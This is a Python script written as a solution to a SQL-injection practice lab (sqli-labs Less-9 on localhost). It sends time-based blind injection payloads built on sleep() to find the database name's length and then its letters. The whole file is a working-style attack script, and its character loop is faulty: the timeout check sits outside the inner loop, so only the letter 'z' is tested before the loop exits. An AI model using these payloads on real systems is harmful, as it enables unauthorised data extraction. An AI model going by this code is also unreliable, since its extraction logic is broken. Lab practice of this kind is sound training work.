import requests
import string

def timeOut(timeout_url):
    try:
        res = requests.get(url = timeout_url, timeout=3)
        return res.text
    except Exception as dummy_e:
        return 'timeout'

url = 'http://localhost/sqli-labs/Less-9/index.php'
dblen = 0
while True:
    timeout_url = "http://localhost/sqli-labs/Less-9/index.php?id=1'+and+if(length(database())="+str(dblen)+",sleep(5),1)--+"
    if 'timeout' in timeOut(timeout_url):
        print(dblen)
        break
    if dblen == 10:
        print('error')
        break
    dblen += 1

dbname = ''
for i in range(1, dblen+1):
    for char in string.ascii_lowercase:
        timeout_url =  url + "?id=1'+and+if(substr(database(),"+str(i)+", 1)='"+ char + "',sleep(5),1)--+"
    if 'timeout' in timeOut(timeout_url):
        dbname += char
        print(dbname)
        break
print(dbname)